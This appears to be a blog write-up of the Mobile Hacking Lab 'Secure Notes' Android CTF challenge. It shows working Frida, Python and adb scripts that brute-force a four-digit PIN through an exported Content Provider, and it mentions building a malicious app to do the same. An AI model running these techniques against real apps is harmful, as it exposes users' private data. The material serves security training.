---
title: Mobile Hacking Lab — Secure Notes
published: 2025-12-14
description: "⭐ NANO IS HERE ⭐"
image: "./Secure_notes.jpeg"
tags: ["Android", "Frida","Mobile Pentesting","Python"]
category: Android Security 
draft: false
---
> [Source](./Secure_notes.jpeg)

⭐ **NANO IS HERE** ⭐
--------------------
**اللهم صلِّ وسلم وبارك على سيدنا محمد ﷺ.**
## Introduction

Today, I will explain how to exploit an exported Android **Content Provider** in the **Secure Notes** challenge from **Mobile Hacking Lab**.

We will solve this challenge using three different approaches:

1. **Frida Dynamic Instrumentation** — Hooking the vulnerable `query()` method at runtime.
2. **Python Offline Brute Force** — Reproducing the encryption process and brute-forcing the PIN locally.
3. **ADB Content Provider Query** — Sending requests directly through the exported provider.

=====================================================================================================

Install the APK using ADB:
```bash
adb install -r secureNotes.apk
```
**Reverse engineer** This APK
To analyze the source code and understand the internal structure of the application, we will use **JADX** (**jadx-gui**) to decompile the APK and examine the Java/Smali code.

**AndroidManifest.xml** 
```   <provider  
            android:name="com.mobilehackinglab.securenotes.SecretDataProvider"  
            android:enabled="true"  
            android:exported="true"  
            android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>  
        <activity  
            android:name="com.mobilehackinglab.securenotes.MainActivity"  
            android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"/>  
                <category android:name="android.intent.category.LAUNCHER"/>  
            </intent-filter>  
        </activity>  
        <provider
```
Inside the assets directory discovered during our analysis, we find the config.properties file containing the encryption parameters:

```encryptedSecret=bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=
salt=m2UvPXkvte7fygEeMr0WUg==
iv=L15Je6YfY5owgIckR9R3DQ==
iterationCount=10000
```

2. Exploitation Methods (Three Ways to Solve)

At this point, we can proceed with brute-forcing the PIN by trying all possible values in the range of 0001 to 9999 using three different methods: using a Frida script, using a Python script, or leveraging adb.


**Method 1**: Frida Dynamic Instrumentation

Using Frida to hook the query method at runtime and test PIN codes dynamically inside the application environment:

```Java.perform(() => {
    var secret = [];
    const secretDataProvider = Java.use('com.mobilehackinglab.securenotes.SecretDataProvider');
    
    secretDataProvider.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', '[Ljava.lang.String;', 'java.lang.String').implementation = function (uri, projection, selection, selectionArgs, sortOrder) {
        var c = null;
        for (let i = 1; i <= 9999; i++) {
            var dat = i.toString().padStart(4, '0');
            console.log("Trying PIN: " + dat);
            c = this.query(uri, projection, `pin=${dat}`, selectionArgs, sortOrder);
        }
        return c;
    }
});
```

**Method 2**: Python Offline Brute-Force

Replicating the AES decryption and PBKDF2 key derivation logic via Python using the extracted config properties:

```
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

encrypted_secret = base64.b64decode("bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=")
salt = base64.b64decode("m2UvPXkvte7fygEeMr0WUg==")
iv = base64.b64decode("L15Je6YfY5owgIckR9R3DQ==")
iteration_count = 10000

def decrypt_secret(password):
    try:
        key = PBKDF2(password, salt, dkLen=32, count=iteration_count)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted_secret)
        pad = decrypted[-1]
        if all(p == pad for p in decrypted[-pad:]):
            return decrypted[:-pad].decode('utf-8')
    except (UnicodeDecodeError, ValueError):
        pass
    return None

for i in range(1, 10000):
    password = f"{i:04d}"
    result = decrypt_secret(password)
    if result:
        print(f"[+] PIN: {password}")
        print(f"[+] Secret: {result}")
        break
```
**Method 3**: ADB Loop Brute-Force

Iterating through all possible PIN combinations directly via the adb shell command:
```
for i in {0001..9999}; do
    echo -n $i" ";adb shell content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin=$i;
done
```
3. **Conclusion & Flag Extraction**

By following any of the methods outlined above, we were able to exploit the app’s exposed Content Provider, which was marked with **exported=true**, to brute-force the PIN. This vulnerability allowed us to bypass the encryption and access sensitive information

**Result:** 
```
PIN: 2***  :)
Secret:CTF{D1d_*****_1t!1?} :)
```

Summary
=========

ال**فكرة هنا مش إننا بنستخدم التولز وخلاص على قد ما هي منهجية تفكير بره الصندوق  بلس ف الاخر نوصل  للهدف إحنا ممكن نحل التحدي بأكتر من طريقة تانية زي إننا نبني التطبيق تاني بس يكون PIN ثابت أو Rebuild للـ APK ونخلي الـ PIN ثابت أو نستخدم Objection مع Frida أو نعمل Malicious App يكلم التطبيق المستهدف وهنا هنستخدم في الـ App بتاعنا ContentResolver علشان يتصل بالتطبيق المستهدف وعشان زي ما شفنا فوق التطبيق سامح إن أي حد يتصل بيه علشان الـ exported true التطبيق هيمشي في Loop يجرب الـ PIN لحد ما يوصل للرقم الصح فـ التطبيق المستهدف هيستقبل الرقم الصح اللي جبناه ويبعت النتيجة ونستقبلها**